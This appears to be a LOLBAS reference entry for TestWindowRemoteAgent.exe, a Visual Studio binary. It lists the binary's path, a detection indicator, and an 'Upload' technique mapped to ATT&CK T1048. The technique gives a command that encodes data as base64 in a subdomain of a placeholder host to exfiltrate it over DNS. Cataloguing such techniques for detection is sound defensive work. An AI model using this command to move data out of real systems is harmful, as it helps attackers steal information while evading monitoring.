---
title: "TestWindowRemoteAgent.exe"
source: lolbas-project.github.io
source_url: https://lolbas-project.github.io/lolbas/OtherMSBinaries/Testwindowremoteagent/
fetched_at: 2026-09-20T17:15:31Z
license: unspecified
category: windows
---

TestWindowRemoteAgent.exe is the command-line tool to establish RPC

## Paths
- C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\IDE\CommonExtensions\Microsoft\TestWindow\RemoteAgent\TestWindowRemoteAgent.exe

## Acknowledgements
- Onat Uzunyayla

## Detections
- IOC: TestWindowRemoteAgent.exe spawning unexpectedly

## Upload

1. Sends DNS query for open connection to any host, enabling exfiltration over DNS

```
TestWindowRemoteAgent.exe start -h {your-base64-data}.example.com -p 8000
```

   - Use case: Attackers may utilize this to exfiltrate data over DNS

   - Privileges required: User

   - Operating systems: Windows 10, Windows 11

   - ATT&CK® technique: T1048
